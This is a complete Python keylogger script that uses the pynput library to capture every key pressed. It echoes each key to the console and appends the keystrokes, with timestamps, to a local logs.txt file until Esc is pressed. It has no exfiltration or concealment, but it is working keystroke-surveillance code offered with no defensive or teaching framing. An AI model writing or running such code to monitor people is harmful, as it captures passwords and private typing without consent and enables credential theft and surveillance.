import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

count = 0
keys = []
start_time = None

def on_press(key):
    global keys, count, start_time
    keys.append(key)
    count += 1
    
    try:
        print("{0} Pressed".format(key.char))
    except AttributeError:
        print("{0} Pressed".format(key))
    
    if start_time is None:
        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if count >= 30:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    global start_time
    with open("logs.txt", "a") as file:
        if start_time is not None:
            file.write(f"\n[{start_time}] \n")
            start_time = None
        for key in keys:
            k = str(key).replace("'", "")
            if "enter" in k:
                file.write("\n")
            elif "space" in k:
                file.write(" ")
            elif k.startswith("Key."):
                file.write(f'"{k}" ')
            else:
                file.write(k)

def on_release(key):
    global start_time
    if key == Key.esc:
        write_file(keys)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
